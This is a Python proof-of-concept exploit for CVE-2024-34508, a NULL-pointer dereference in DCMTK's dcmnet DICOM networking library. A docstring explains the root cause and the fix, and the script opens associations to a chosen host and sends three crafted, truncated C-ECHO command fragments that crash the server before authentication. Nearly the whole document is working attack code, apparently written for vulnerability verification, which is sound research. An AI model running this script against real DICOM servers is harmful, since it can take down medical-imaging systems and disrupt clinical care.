#!/usr/bin/env python3
"""
PoC for DCMTK CVE-2024-34508 (DCMTK issue #1114) — dcmnet NULL-pointer deref
while parsing an INVALID incoming DIMSE message.

VERIFIED crash (real DCMTK 3.6.8 built with ASan+UBSan):
  dcmnet/libsrc/dimcmd.cc:208:20: runtime error: null pointer passed as
      argument 2, which is declared to never be null
  AddressSanitizer: SEGV on unknown address 0x000000000000
    #3 getString            dcmnet/libsrc/dimcmd.cc:208   <-- strncpy(s, NULL, maxlen)
    #4 getAndDeleteString   dcmnet/libsrc/dimcmd.cc:232
    #5 parseCEchoRQ         dcmnet/libsrc/dimcmd.cc:505
    #6 DIMSE_parseCmdObject dcmnet/libsrc/dimcmd.cc:1884
    #7 DIMSE_receiveCommand dcmnet/libsrc/dimse.cc:1230

Root cause (fixed in commit c78e434c, DCMTK-3.6.9):
  dcmnet/libsrc/dimcmd.cc getString():
      ec = elem->getString(aString);   // aString = DcmElement::getValue()
      strncpy(s, aString, maxlen);     // <-- ran unconditionally
  When the element's value cannot be loaded, getValue()->loadValue() fails and
  returns NULL, so aString == NULL and strncpy(s, NULL, 64) dereferences NULL.
  The fix wraps the strncpy/strip block in `if (ec.good())`.

Why the value fails to load — the DIMSE command set is read incrementally from
a DcmInputBufferStream, one P-DATA-TF PDV fragment at a time (dcmnet/libsrc/
dimse.cc DIMSE_receiveCommand). We declare AffectedSOPClassUID (0000,0002) with
a 64-byte value length but stop the fragment chain before the value bytes
arrive. dcmdata creates the element with the value deferred (fValue == NULL);
the later getString() in the command parser then forces the lazy load against
an exhausted stream -> NULL -> SIGSEGV.

The NULL-deref is sensitive to the allocator state, so this PoC drives THREE
malformed associations in sequence (header-only, header+partial, single-PDV);
the combination deterministically lands on the uninitialised-value path. Each
case is an A-ASSOCIATE handshake (Verification SOP) + malformed command PDV(s),
PRE-AUTH — no real C-ECHO completes.

Usage: poc_getstring_34508.py <host> <port>
"""
import socket
import struct
import sys
import time

APP_CTX = b"1.2.840.10008.3.1.1.1"
VERIFICATION_SOP = b"1.2.840.10008.1.1"
IMPLICIT_VR_LE = b"1.2.840.10008.1.2"


def sub_item(item_type, payload):
    return bytes([item_type, 0x00]) + struct.pack(">H", len(payload)) + payload


def build_associate_rq():
    pc_body = bytes([0x01, 0x00, 0x00, 0x00])
    pc_body += sub_item(0x30, VERIFICATION_SOP)
    pc_body += sub_item(0x40, IMPLICIT_VR_LE)
    var = sub_item(0x10, APP_CTX) + sub_item(0x20, pc_body)
    var += sub_item(0x50, sub_item(0x51, struct.pack(">I", 16384)))
    fixed = struct.pack(">H", 0x0001) + b"\x00\x00"
    fixed += (b"ANY-SCP" + b" " * 16)[:16]
    fixed += (b"OIDA-POC" + b" " * 16)[:16]
    fixed += b"\x00" * 32
    body = fixed + var
    return bytes([0x01, 0x00]) + struct.pack(">I", len(body)) + body


def pdv(ctx_id, msg_ctrl, data):
    body = bytes([ctx_id, msg_ctrl]) + data
    return struct.pack(">I", len(body)) + body


def p_data_tf(*pdvs):
    blob = b"".join(pdvs)
    return bytes([0x04, 0x00]) + struct.pack(">I", len(blob)) + blob


def command_up_to_value_header():
    """C-ECHO-RQ command group (implicit VR LE) ending at the AffectedSOPClassUID
    element header which declares a 64-byte value (value bytes NOT included)."""
    head = struct.pack("<HHI", 0x0000, 0x0100, 2) + struct.pack("<H", 0x0030)   # C-ECHO-RQ
    head += struct.pack("<HHI", 0x0000, 0x0110, 2) + struct.pack("<H", 0x0001)  # MessageID
    head += struct.pack("<HHI", 0x0000, 0x0800, 2) + struct.pack("<H", 0x0101)  # DataSetType=NULL
    aff_hdr = struct.pack("<HHI", 0x0000, 0x0002, 64)                           # UI len=64, no value
    grouplen = struct.pack("<HHI", 0x0000, 0x0000, 4) + struct.pack("<I", len(head) + 8 + 64)
    return grouplen + head + aff_hdr


def recv_pdu(s):
    hdr = s.recv(6)
    if len(hdr) < 6:
        return None
    length = struct.unpack(">I", hdr[2:6])[0]
    got = 0
    while got < length:
        chunk = s.recv(length - got)
        if not chunk:
            break
        got += len(chunk)
    return hdr[0]


def one_case(host, port, frags, label):
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.settimeout(4)
        s.sendall(build_associate_rq())
        if recv_pdu(s) != 0x02:
            print(f"[{label}] association not accepted")
            s.close()
            return False
        for f in frags:
            s.sendall(f)
            time.sleep(0.15)
        time.sleep(0.5)
        try:
            data = s.recv(64)
            crashed = not data
            print(f"[{label}] {'peer closed -> crash' if crashed else 'reply 0x%02x' % data[0]}")
        except (socket.timeout, OSError):
            crashed = True
            print(f"[{label}] no reply -> crash")
        s.close()
        return crashed
    except OSError as e:
        # connection refused == server already dead from a previous case
        print(f"[{label}] connection error ({e}) -> server already crashed")
        return True


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11112
    print(f"[*] Target {host}:{port}  CVE-2024-34508 dcmnet getString NULL deref")

    partial = command_up_to_value_header()
    # Case A: header-only command across two PDVs (not-last, then last-empty)
    one_case(host, port, [p_data_tf(pdv(1, 0x00, partial)),
                          p_data_tf(pdv(1, 0x02, b""))], "A:hdr-then-lastempty")
    # Case B: header + 8 of 64 value bytes (not-last), then last-empty
    one_case(host, port, [p_data_tf(pdv(1, 0x00, partial + b"1.2.840\x00")),
                          p_data_tf(pdv(1, 0x02, b""))], "B:hdr+8-then-lastempty")
    # Case C: single PDV marked last, 64-byte value declared, none supplied
    one_case(host, port, [p_data_tf(pdv(1, 0x03, partial))], "C:single-last-no-value")

    print("[*] Done. Check `docker logs` for ASan SEGV in getString/dimcmd.cc:208.")


if __name__ == "__main__":
    main()
